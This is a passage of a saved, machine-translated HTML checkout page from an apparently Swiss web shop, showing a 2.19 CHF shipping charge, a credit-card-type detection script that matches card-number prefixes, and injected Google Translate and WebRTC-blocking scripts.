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" data-deferred="1" jsname="Q4LuWd" width="267" height="180" data-index="0" alt="Zurich, Suisse - 11 Décembre, 2015: Un Colis Déchargeant Postier Poste  Suisse D'une Camionnette Garée Sur La Place Munsterhof Dans La Vieille  Ville De La Ville. La Poste Suisse Est Le Service" data-iml="1892.455000001064" data-atf="true">
									
								
							
							
						</div>
					</div>
					<div class="col-5 title-col">
						<div class="item-title">
							<p><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Frais d'expédition supplémentaires</font></font></font></font></font></font></font></font></font></font><i></i>
							</p>
						</div>
						
					</div>
					<div class="col-4 flex-grow-0 buttons-col">
						<div class="d-flex buttons-col-container justify-content-between h-100">
							<div class="item-delete-button">
								<button class="btn-update-cart-item-quantity" data-input-selector="#cartQuantityProductId_147" value="0"><i class="far fa-trash-alt"></i></button>
							</div>
							<div class="item-price-total">
								<p class="item-price"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,19 CHF</font></font></font></font></font></font></font></font></font></font></p>
								<p class="item-vat-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
								
								
									(2,19 CHF. DPH)
								
								</font></font></font></font></font></font></font></font></p>
							</div>
						</div>
					</div>
				</div>
				
				
			</div>
			
		
	
	</div>
	
	
	<div class="summary-subtotal">
		
	<div class="summary-total">
		<div class="row">
			<div class="col">
				<div class="text-left">
					<p class="total-title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Le total</font></font></font></font></font></font></font></font></font></font></p>
				</div>
			</div>
			<div class="col">
				<div class="text-right">
					<p class="total-amount"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2,19 CHF</font></font></font></font></font></font></font></font></font></font></p>
					
					<p class="total-vat-included"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
					
					
						(y compris la TVA)
					
					</font></font></font></font></font></font></font></font></font></font></p>
				</div>
			</div>
		</div>
	</div>
</div></section>
</div>
			</div>
		</div>
		
	</div>
</section>

		</section>
		
		<section class="common-screen-footer">
		
		</section>
		
		
		
		
				<div id="sliderloadingwrapper">
<div id="sliderloader">
<div id="progressbg">
<div id="johanesloader">
</div></div></div></div>



<script src="https://static.codepen.io/assets/common/stopExecutionOnTimeout-157cd5b220a5c80d4ff8e0e70ac069bffd87a61252088146915e8726e5d9f147.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>
<script id="rendered-js">


  
/******/(function (modules) {// webpackBootstrap
  /******/ // The module cache
  /******/var installedModules = {};

  /******/ // The require function
  /******/function __webpack_require__(moduleId) {

    /******/ // Check if module is in cache
    /******/if (installedModules[moduleId])
      /******/return installedModules[moduleId].exports;

    /******/ // Create a new module (and put it into the cache)
    /******/var module = installedModules[moduleId] = {
      /******/exports: {},
      /******/id: moduleId,
      /******/loaded: false
      /******/ };

    /******/ // Execute the module function
    /******/modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);

    /******/ // Flag the module as loaded
    /******/module.loaded = true;

    /******/ // Return the exports of the module
    /******/return module.exports;
    /******/}


  /******/ // expose the modules object (__webpack_modules__)
  /******/__webpack_require__.m = modules;

  /******/ // expose the module cache
  /******/__webpack_require__.c = installedModules;

  /******/ // __webpack_public_path__
  /******/__webpack_require__.p = "/scripts/dist/";

  /******/ // Load entry module and return exports
  /******/return __webpack_require__(0);
  /******/})(
/************************************************************************/
/******/[
/* 0 */
/***/function (module, exports, __webpack_require__) {

  __webpack_require__(1);


  /***/},
/* 1 */
/***/function (module, exports, __webpack_require__) {

  'use strict';

  var _creditCardType = __webpack_require__(2);

  var _creditCardType2 = _interopRequireDefault(_creditCardType);

  function _interopRequireDefault(obj) {return obj && obj.__esModule ? obj : { default: obj };}

  $(document).on('input change', '#input--cc input', function () {
    var ccNum = $(this).val();
    var ccType = (0, _creditCardType2.default)(ccNum);

    if (!ccNum.length || typeof ccType === "undefined" || !ccType.length) {
      $('#input--cc').removeClass().addClass('creditcard-icon');
      return;
    }

    var creditcardType = ccType[0].type;

    var ccTypes = {
      'american-express': 'AE',
      'master-card': 'MC',
      'visa': 'VI',
      'discover': 'DI' };


    $('#input--cc').removeClass().addClass('creditcard-icon').addClass('creditcard-icon--' + creditcardType); //set creditcard icon

    // select creditcard type
    $(".creditcard-type > select").val(ccTypes[creditcardType]);
    // set the creditcard type <select> to the value entered
  });

  /***/},
/* 2 */
/***/function (module, exports) {

  'use strict';

  var types = {};
  var VISA = 'visa';
  var MASTERCARD = 'master-card';
  var AMERICAN_EXPRESS = 'american-express';
  var DINERS_CLUB = 'diners-club';
  var DISCOVER = 'discover';
  var JCB = 'jcb';
  var UNIONPAY = 'unionpay';
  var MAESTRO = 'maestro';
  var CVV = 'CVV';
  var CID = 'CID';
  var CVC = 'CVC';
  var CVN = 'CVN';
  var testOrder = [
  VISA,
  MASTERCARD,
  AMERICAN_EXPRESS,
  DINERS_CLUB,
  DISCOVER,
  JCB,
  UNIONPAY,
  MAESTRO];


  function clone(x) {
    var prefixPattern, exactPattern, dupe;

    if (!x) {return null;}

    prefixPattern = x.prefixPattern.source;
    exactPattern = x.exactPattern.source;
    dupe = JSON.parse(JSON.stringify(x));
    dupe.prefixPattern = prefixPattern;
    dupe.exactPattern = exactPattern;

    return dupe;
  }

  types[VISA] = {
    niceType: 'Visa',
    type: VISA,
    prefixPattern: /^4$/,
    exactPattern: /^4\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVV,
      size: 3 } };



  types[MASTERCARD] = {
    niceType: 'MasterCard',
    type: MASTERCARD,
    prefixPattern: /^(5|5[1-5]|2|22|222|222[1-9]|2[3-6]|27[0-1]|2720)$/,
    exactPattern: /^(5[1-5]|222[1-9]|2[3-6]|27[0-1]|2720)\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVC,
      size: 3 } };



  types[AMERICAN_EXPRESS] = {
    niceType: 'American Express',
    type: AMERICAN_EXPRESS,
    prefixPattern: /^(3|34|37)$/,
    exactPattern: /^3[47]\d*$/,
    isAmex: true,
    gaps: [4, 10],
    lengths: [15],
    code: {
      name: CID,
      size: 4 } };



  types[DINERS_CLUB] = {
    niceType: 'Diners Club',
    type: DINERS_CLUB,
    prefixPattern: /^(3|3[0689]|30[0-5])$/,
    exactPattern: /^3(0[0-5]|[689])\d*$/,
    gaps: [4, 10],
    lengths: [14],
    code: {
      name: CVV,
      size: 3 } };



  types[DISCOVER] = {
    niceType: 'Discover',
    type: DISCOVER,
    prefixPattern: /^(6|60|601|6011|65|64|64[4-9])$/,
    exactPattern: /^(6011|65|64[4-9])\d*$/,
    gaps: [4, 8, 12],
    lengths: [16, 19],
    code: {
      name: CID,
      size: 3 } };



  types[JCB] = {
    niceType: 'JCB',
    type: JCB,
    prefixPattern: /^(2|21|213|2131|1|18|180|1800|3|35)$/,
    exactPattern: /^(2131|1800|35)\d*$/,
    gaps: [4, 8, 12],
    lengths: [16],
    code: {
      name: CVV,
      size: 3 } };



  types[UNIONPAY] = {
    niceType: 'UnionPay',
    type: UNIONPAY,
    prefixPattern: /^(6|62)$/,
    exactPattern: /^62\d*$/,
    gaps: [4, 8, 12],
    lengths: [16, 17, 18, 19],
    code: {
      name: CVN,
      size: 3 } };



  types[MAESTRO] = {
    niceType: 'Maestro',
    type: MAESTRO,
    prefixPattern: /^(5|5[06-9]|6\d*)$/,
    exactPattern: /^5[06-9]\d*$/,
    gaps: [4, 8, 12],
    lengths: [12, 13, 14, 15, 16, 17, 18, 19],
    code: {
      name: CVC,
      size: 3 } };



  function creditCardType(cardNumber) {
    var type, value, i;
    var prefixResults = [];
    var exactResults = [];

    if (!(typeof cardNumber === 'string' || cardNumber instanceof String)) {
      return [];
    }

    for (i = 0; i < testOrder.length; i++) {if (window.CP.shouldStopExecution(0)) break;
      type = testOrder[i];
      value = types[type];

      if (cardNumber.length === 0) {
        prefixResults.push(clone(value));
        continue;
      }

      if (value.exactPattern.test(cardNumber)) {
        exactResults.push(clone(value));
      } else if (value.prefixPattern.test(cardNumber)) {
        prefixResults.push(clone(value));
      }
    }window.CP.exitedLoop(0);

    return exactResults.length ? exactResults : prefixResults;
  }

  creditCardType.getTypeInfo = function (type) {
    return clone(types[type]);
  };

  creditCardType.types = {
    VISA: VISA,
    MASTERCARD: MASTERCARD,
    AMERICAN_EXPRESS: AMERICAN_EXPRESS,
    DINERS_CLUB: DINERS_CLUB,
    DISCOVER: DISCOVER,
    JCB: JCB,
    UNIONPAY: UNIONPAY,
    MAESTRO: MAESTRO };


  module.exports = creditCardType;


  /***/}
/******/]);
//# sourceURL=pen.js
    </script><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div>
		
		
	

<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" alt="Google Translate" width="20" height="20"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Original text</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Contribute a better translation</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div>
<br style="background: #6060e8;">
<div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div><div id="goog-gt-tt" class="skiptranslate" dir="ltr"><div style="padding: 8px;"><div><div class="logo"><img src="https://www.gstatic.com/images/branding/product/1x/translate_24dp.png" width="20" height="20" alt="Google Traduction"></div></div></div><div class="top" style="padding: 8px; float: left; width: 100%;"><h1 class="title gray">Texte d'origine</h1></div><div class="middle" style="padding: 8px;"><div class="original-text"></div></div><div class="bottom" style="padding: 8px;"><div class="activity-links"><span class="activity-link">Proposer une meilleure traduction</span><span class="activity-link"></span></div><div class="started-activity-container"><hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"><div class="activity-root"></div></div></div><div class="status-message" style="display: none;"></div></div><script type="text/javascript" id="webrtc-control">(function () {
      if (typeof navigator.getUserMedia !== "undefined") navigator.getUserMedia = undefined;
      if (typeof window.MediaStreamTrack !== "undefined") window.MediaStreamTrack = undefined;
      if (typeof window.RTCPeerConnection !== "undefined") window.RTCPeerConnection = undefined;
      if (typeof window.RTCSessionDescription !== "undefined") window.RTCSessionDescription = undefined;
      //
      if (typeof navigator.mozGetUserMedia !== "undefined") navigator.mozGetUserMedia = undefined;
      if (typeof window.mozMediaStreamTrack !== "undefined") window.mozMediaStreamTrack = undefined;
      if (typeof window.mozRTCPeerConnection !== "undefined") window.mozRTCPeerConnection = undefined;
      if (typeof window.mozRTCSessionDescription !== "undefined") window.mozRTCSessionDescription = undefined;
      //
      if (typeof navigator.webkitGetUserMedia !== "undefined") navigator.webkitGetUserMedia = undefined;
      if (typeof window.webkitMediaStreamTrack !== "undefined") window.webkitMediaStreamTrack = undefined;
      if (typeof window.webkitRTCPeerConnection !== "undefined") window.webkitRTCPeerConnection = undefined;
      if (typeof window.webkitRTCSessionDescription !== "undefined") window.webkitRTCSessionDescription = undefined;
    })(); </script><div class="goog-te-spinner-pos"><div class="goog-te-spinner-animation"><svg xmlns="http://www.w3.org/2000/svg" class="goog-te-spinner" width="96px" height="96px" viewBox="0 0 66 66"><circle class="goog-te-spinner-path" fill="none" stroke-width="6" stroke-linecap="round" cx="33" cy="33" r="30"></circle></svg></div></div></body></html>